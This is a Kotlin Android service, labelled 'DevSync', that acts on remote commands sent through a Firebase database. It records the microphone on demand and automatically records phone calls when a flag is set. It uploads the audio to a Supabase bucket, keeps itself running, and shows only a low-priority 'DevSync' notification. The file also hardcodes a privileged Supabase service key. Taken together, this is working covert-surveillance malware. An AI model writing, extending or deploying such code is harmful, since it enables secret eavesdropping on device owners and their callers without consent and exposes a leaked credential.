package com.example.devsync

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.os.*
import android.provider.Settings
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File

class RecordingService : Service() {

    companion object {
        const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
        const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
        const val BUCKET = "recordings"
        const val NOTIF_ID = 1002
    }

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    private val database by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("devices/$deviceId")
    }
    private val regRef by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
    }
    private val httpClient = OkHttpClient.Builder()
        .callTimeout(90, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    private var mediaRecorder: MediaRecorder? = null
    private var currentFile: File?   = null
    private var recordingJob: Job?   = null
    private var isRecording          = false
    private var callRecordingEnabled = false
    private var inCall               = false

    @Suppress("DEPRECATION")
    private var phoneStateListener: PhoneStateListener? = null

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        // Android 14+ requires service type in startForeground() when declared in manifest
        // Android 14+ also requires RECORD_AUDIO permission — use try/catch for safety
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) { // API 30+
                startForeground(NOTIF_ID, buildNotification("Ready"),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
            } else {
                startForeground(NOTIF_ID, buildNotification("Ready"))
            }
        } catch (e: Exception) {
            // Permission not yet granted — start without microphone type
            try { startForeground(NOTIF_ID, buildNotification("Ready")) }
            catch (_: Exception) { stopSelf(); return }
        }

        reportStatus("🎙️ Recording service ready")
        setupFirebaseListeners()
        setupCallRecording()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        recordingJob?.cancel()
        safeStopRecorder()
        @Suppress("DEPRECATION")
        (getSystemService(TELEPHONY_SERVICE) as TelephonyManager)
            .listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
    }

    // ── Notification ──────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                "rec_channel", "Recording Service", NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(text: String): Notification =
        NotificationCompat.Builder(this, "rec_channel")
            .setContentTitle("DevSync")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun updateNotification(text: String) =
        getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(text))

    // ── Firebase ──────────────────────────────────────────────────────────────

    private fun setupFirebaseListeners() {
        database.child("start_recording").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                if (!s.exists()) return
                val dur = s.getValue(Long::class.java) ?: 30L
                database.child("start_recording").removeValue()
                if (!isRecording) startMicRecording(dur) else reportStatus("⚠️ Already recording")
            }
            override fun onCancelled(e: DatabaseError) {}
        })

        database.child("stop_recording").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                if (s.exists() && s.getValue(Boolean::class.java) == true) {
                    database.child("stop_recording").removeValue()
                    if (isRecording) stopAndUpload("mic") else reportStatus("ℹ️ Not recording")
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })

        database.child("call_recording_enabled").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                callRecordingEnabled = s.getValue(Boolean::class.java) ?: false
                regRef.child("callRecordingEnabled").setValue(callRecordingEnabled)
                reportStatus(if (callRecordingEnabled) "📞 Call recording ON" else "📞 Call recording OFF")
            }
            override fun onCancelled(e: DatabaseError) {}
        })

        database.child("stop_all").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                if (s.exists() && s.getValue(Boolean::class.java) == true && isRecording)
                    stopAndUpload("mic")
            }
            override fun onCancelled(e: DatabaseError) {}
        })
    }

    // ── Microphone Recording ──────────────────────────────────────────────────

    private fun startMicRecording(durationSec: Long) {
        try {
            val file = File(cacheDir,
                "mic_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.m4a")
            currentFile = file

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                MediaRecorder(this)
            else
                @Suppress("DEPRECATION") MediaRecorder()

            mediaRecorder!!.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128_000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            isRecording = true
            reportStatus("🔴 Recording started (${durationSec}s)")
            updateNotification("🔴 Recording... ${durationSec}s")

            recordingJob = CoroutineScope(Dispatchers.IO).launch {
                var remaining = durationSec
                while (remaining > 0 && isRecording) {
                    delay(10_000L)
                    remaining -= 10
                    if (isRecording && remaining > 0)
                        withContext(Dispatchers.Main) {
                            reportStatus("🔴 Recording... ${remaining}s left")
                        }
                }
                withContext(Dispatchers.Main) {
                    if (isRecording) stopAndUpload("mic")
                }
            }
        } catch (e: Exception) {
            isRecording = false
            reportStatus("❌ Mic error: ${e.message?.take(80)}")
        }
    }

    // ── Call Recording ────────────────────────────────────────────────────────

    @Suppress("DEPRECATION")
    private fun setupCallRecording() {
        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        phoneStateListener = object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        if (callRecordingEnabled && !isRecording) {
                            inCall = true
                            reportStatus("📞 Call detected — recording...")
                            startMicRecording(180L)
                        }
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        if (inCall) {
                            inCall = false
                            if (isRecording) stopAndUpload("call")
                        }
                    }
                    TelephonyManager.CALL_STATE_RINGING ->
                        reportStatus("📞 Incoming call...")
                }
            }
        }
        tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
    }

    // ── Stop & Upload ─────────────────────────────────────────────────────────

    private fun stopAndUpload(type: String) {
        recordingJob?.cancel()
        val file = currentFile ?: run { reportStatus("❌ No recording file"); return }
        safeStopRecorder()
        isRecording = false
        updateNotification("📤 Uploading...")
        reportStatus("📤 Uploading ${type} recording (${file.length() / 1024}KB)...")

        CoroutineScope(Dispatchers.IO).launch {
            if (!file.exists() || file.length() < 1024L) {
                withContext(Dispatchers.Main) { reportStatus("❌ Recording file empty/missing") }
                return@launch
            }
            try {
                val fileName = "${type}_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.m4a"
                val req = Request.Builder()
                    .url("$SUPABASE_URL/storage/v1/object/$BUCKET/$fileName")
                    .header("Authorization", "Bearer $SUPABASE_KEY")
                    .header("apikey", SUPABASE_KEY)
                    .header("Content-Type", "audio/mp4")
                    .header("x-upsert", "true")
                    .post(file.readBytes().toRequestBody("audio/mp4".toMediaType()))
                    .build()

                httpClient.newCall(req).execute().use { resp ->
                    withContext(Dispatchers.Main) {
                        if (resp.isSuccessful) {
                            val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$fileName"
                            FirebaseDatabase.getInstance(DB_URL)
                                .getReference("recordings").push()
                                .setValue(mapOf(
                                    "deviceId"  to deviceId,
                                    "type"      to type,
                                    "url"       to url,
                                    "timestamp" to System.currentTimeMillis(),
                                    "fileName"  to fileName
                                ))
                            reportStatus("✅ ${type} uploaded (${file.length() / 1024}KB)")
                            updateNotification("✅ Uploaded")
                        } else {
                            reportStatus("❌ Upload ${resp.code}: ${resp.body?.string()?.take(80)}")
                        }
                    }
                }
                file.delete()
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    reportStatus("❌ Upload error: ${e.message?.take(80)}")
                }
            }
        }
    }

    private fun safeStopRecorder() {
        try { mediaRecorder?.stop()    } catch (_: Exception) {}
        try { mediaRecorder?.release() } catch (_: Exception) {}
        mediaRecorder = null
    }

    private fun reportStatus(status: String) {
        regRef.child("lastStatus").setValue(status)
        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
    }
}
